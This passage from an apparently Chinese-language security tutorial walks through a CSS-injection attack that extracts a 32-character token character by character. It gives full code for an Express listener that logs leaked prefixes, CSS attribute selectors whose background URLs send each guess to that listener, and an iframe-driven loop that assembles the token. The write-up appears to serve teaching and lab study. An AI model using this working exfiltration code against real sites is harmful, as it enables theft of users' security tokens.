class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及相应的服务代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.disable(<span class="hljs-string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/token/:token'</span>,(req,res) =&gt; {</span><br><span class="line">    <span class="hljs-keyword">const</span> { token } = req.params; <span class="hljs-comment">//var {a} = {a:1, b:2}; =&gt; var obj = {a:1, b:2};var a = obj.a;</span></span><br><span class="line">        <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">    res.cookie(<span class="hljs-string">'token'</span>,token);</span><br><span class="line">    res.send(<span class="hljs-string">''</span>)</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/cookie.js'</span>,(req,res) =&gt; {</span><br><span class="line">    res.sendFile(<span class="hljs-string">'js.cookie.js'</span>,{</span><br><span class="line">        root: <span class="hljs-string">'./node_modules/js-cookie/src/'</span></span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/index.html'</span>,(req,res) =&gt; {</span><br><span class="line">    res.sendFile(<span class="hljs-string">'index.html'</span>,{</span><br><span class="line">        root: <span class="hljs-string">'.'</span></span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Listening on <span class="hljs-subst">${PORT}</span>...`</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后使用<code>node index.js</code>跑起来就行了。</p><p>整个流程大致是如下一个流程：</p><ol><li>如果我们目前提取的 token 长度小于预期的长度，则我们执行以下操作</li><li>删除包含所有先前提取数据的 cookie</li><li>创建一个 iframe 标签，并 src 指向我们构造好的字符爆破的页面。</li><li>我们一直等到自己的服务 callback 为爆破请求设置含有 token 的 cookie</li><li>设置 cookie 后，我们将其设置为当前的已知 token 值，并返回到步骤1</li></ol><p>所以我们可以有大致以下框架：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line">      clearTokenCookie();</span><br><span class="line">      createIframeWithCss();</span><br><span class="line"><span class="hljs-javascript">      extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line">    }</span><br><span class="line">  })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>首先我们可以直接使用 <a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">js-cookie</a> 这个项目来直接清除 cookie</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    Cookies.remove(<span class="hljs-string">'token'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来，我们需要为 <code>iframe</code> 标签构造注入的页面 URL :</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createIframeWithCss</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  iframe.src = <span class="hljs-string">'http://127.0.0.1/css.php?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(generateCSS());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及生成 css 的函数：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateCSS</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> css = <span class="hljs-string">''</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> ALPHABET) {</span><br><span class="line">    css += <span class="hljs-string">`input[value^="<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>"] {</span></span><br><span class="line"><span class="hljs-string">background: url(http://127.0.0.1:3000/token/<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>)</span></span><br><span class="line"><span class="hljs-string">}`</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> css;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后我们需要实现通过等待反向连接来设置 cookie ，用 JS 中的 <code>Promise</code> 机制来构建异步函数，每隔50毫秒检查一次 cookie 是否已设置，如果已设置，该函数将立即返回该值。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">            <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span><br><span class="line">            <span class="hljs-keyword">if</span> (token) {</span><br><span class="line">                clearInterval(interval);</span><br><span class="line">                resolve(token);</span><br><span class="line">            }</span><br><span class="line">        }, <span class="hljs-number">50</span>);</span><br><span class="line">    });</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后整合起来的攻击方式是这样的：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/cookie.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">        (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line">                clearTokenCookie();</span><br><span class="line">                createIframeWithCss();</span><br><span class="line"><span class="hljs-javascript">                extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">                        if (token) {</span><br><span class="line">                            clearInterval(interval);</span><br><span class="line">                            resolve(token);</span><br><span class="line">                        }</span><br><span class="line">                    }, 50);</span><br><span class="line">                });</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">                Cookies.remove(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateCSS</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> css = <span class="hljs-string">''</span>;</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> ALPHABET) {</span></span><br><span class="line"><span class="hljs-javascript">                    css += <span class="hljs-string">`input[value^="<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>"] {</span></span></span><br><span class="line"><span class="hljs-actionscript">                            background: url(http:<span class="hljs-comment">//127.0.0.1:3000/token/${extractedToken}${char})</span></span></span><br><span class="line">                        }`;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">return</span> css;</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createIframeWithCss</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://127.0.0.1/css.php?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(generateCSS());</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        })();</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>效果如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122947.png" alt=""></p><h3 id="Token1-Same-Origin"><a href="#Token1-Same-Origin" class="headerlink" title="Token1 - Same Origin"></a>Token1 - Same Origin</h3><p>这个过程需要理解的就是在字符注入爆破成功时设置的 cookie ，它需要我们用 iframe src 同源的域名才能拿到这个 cookie ，否则会受到同源策略的限制拿不到，我们可以做一个简单的测试：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/token/7"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/cookie.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line">    clearTokenCookie();</span><br><span class="line"><span class="hljs-javascript">    extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">          <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">          if (token) {</span><br><span class="line">            clearInterval(interval);</span><br><span class="line">            resolve(token);</span><br><span class="line">          }</span><br><span class="line">        }, 50);</span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">      Cookies.remove(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">    }</span><br><span class="line">  })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/token/78"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90K